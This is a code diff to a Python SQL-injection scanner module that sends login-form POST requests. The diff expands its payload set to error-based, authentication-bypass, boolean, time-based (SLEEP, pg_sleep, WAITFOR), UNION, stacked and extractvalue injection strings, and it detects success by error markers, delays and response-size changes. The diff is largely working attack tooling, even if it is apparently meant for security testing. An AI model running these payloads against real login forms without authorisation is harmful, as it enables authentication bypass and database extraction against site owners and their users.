@@ -14,16 +14,27 @@ SUCCESS_MARKERS = [
     "welcome", "administrator", "admin panel", "profile",
 ]
 
-# Payload'ы для SQLi bypass
-BYPASS_PAYLOADS = [
-    "' OR '1'='1",
-    "admin'--",
-    "admin'#",
-    "' OR 1=1--",
-    "' OR 'x'='x",
-    "') OR ('1'='1",
-    "' UNION SELECT NULL--",
-    "' OR SLEEP(3)--",
+# Все профильные payload'ы (error + boolean + time + union)
+PROBES = [
+    ("error",     "'",                              "error"),
+    ("error",     '"',                              "error"),
+    ("error",     "')",                             "error"),
+    ("bypass",    "' OR '1'='1",                    "bypass"),
+    ("bypass",    "admin'--",                       "bypass"),
+    ("bypass",    "admin'#",                        "bypass"),
+    ("bypass",    "' OR 1=1--",                     "bypass"),
+    ("bypass",    "' OR 'x'='x",                    "bypass"),
+    ("bypass",    "') OR ('1'='1",                  "bypass"),
+    ("boolean",   "' AND '1'='1",                   "boolean"),
+    ("boolean",   "' AND '1'='2",                   "boolean"),
+    ("time",      "' AND SLEEP(3)-- -",             "time"),
+    ("time",      "'; SELECT pg_sleep(3)-- -",      "time"),
+    ("time",      "'; WAITFOR DELAY '0:0:3'-- -",   "time"),
+    ("union",     "' UNION SELECT NULL-- -",        "union"),
+    ("union",     "' UNION SELECT NULL,NULL-- -",   "union"),
+    ("union",     "' UNION SELECT 1,2,3-- -",       "union"),
+    ("stacked",   "'; SELECT 1-- -",                "stacked"),
+    ("extract",   "' AND extractvalue(1,concat(0x7e,version()))-- -", "extract"),
 ]
 
 ERROR_MARKERS = [
@@ -83,34 +94,67 @@ class SqliPost:
                 continue
             base_has_success = self._has_success(base)
 
-            # try bypass payloads on each field
+            # test all probes on each field
             for field in [user_field, pass_field]:
-                for payload in BYPASS_PAYLOADS:
+                field_found = False
+                for pname, payload, ptype in PROBES:
+                    if field_found:
+                        break
+
                     data = {user_field: "admin", pass_field: "x"}
                     data[field] = payload
+                    t0 = __import__("time").time()
                     r = http.post(url, data=data, allow_redirects=True)
+                    dt = __import__("time").time() - t0
                     if not r:
                         continue
 
-                    # check error
                     low = r.text.lower()
-                    err = next((m for m in ERROR_MARKERS if m in low), None)
-                    if err:
-                        print(f"    ✓ SQL ERROR in {field}: {payload[:30]} → {err}")
-                        findings.append({"field": field, "payload": payload,
-                                         "type": "error", "marker": err})
-                        logger.finding("sqli_post_error", "high",
-                                       f"{field}={payload[:40]} ({err})")
-                        break
 
-                    # check bypass (success marker появился где baseline не имел)
-                    if not base_has_success and self._has_success(r):
-                        print(f"    ✓ BYPASS in {field}: {payload[:30]}")
+                    # 1. error
+                    if ptype in ("error", "extract"):
+                        err = next((m for m in ERROR_MARKERS if m in low), None)
+                        if err:
+                            print(f"    ✓ SQL ERROR [{pname}] {field}: {payload[:30]} → {err}")
+                            findings.append({"field": field, "payload": payload,
+                                             "type": "error", "marker": err})
+                            logger.finding("sqli_post_error", "high",
+                                           f"{field}={payload[:40]} ({err})")
+                            field_found = True
+                            continue
+
+                    # 2. time
+                    if ptype == "time" and dt > 2.5:
+                        print(f"    ✓ TIME [{pname}] {field}: delay={dt:.2f}s")
+                        findings.append({"field": field, "payload": payload,
+                                         "type": "time", "delay": round(dt, 2)})
+                        logger.finding("sqli_post_time", "high",
+                                       f"{field}={payload[:40]} delay={dt:.2f}s")
+                        field_found = True
+                        continue
+
+                    # 3. union
+                    if ptype == "union":
+                        if len(r.content) != len(base.content) and abs(len(r.content) - len(base.content)) > 50:
+                            print(f"    ✓ UNION [{pname}] {field}: diff={len(r.content)-len(base.content):+d}b")
+                            findings.append({"field": field, "payload": payload,
+                                             "type": "union"})
+                            logger.finding("sqli_post_union", "high",
+                                           f"{field}={payload[:40]}")
+                            field_found = True
+                            continue
+
+                    # 4. bypass
+                    if ptype == "bypass" and not base_has_success and self._has_success(r):
+                        print(f"    ✓ BYPASS [{pname}] {field}: {payload[:30]}")
                         findings.append({"field": field, "payload": payload,
                                          "type": "auth_bypass"})
                         logger.finding("sqli_post_bypass", "critical",
                                        f"{field}={payload[:40]}")
-                        break
+                        field_found = True
+                        continue
+
+                    # 5. boolean — сравнение произойдёт после цикла
 
             # verification: 2nd attempt with mutated payload if bypass found
             if any(f["type"] == "auth_bypass" for f in findings):
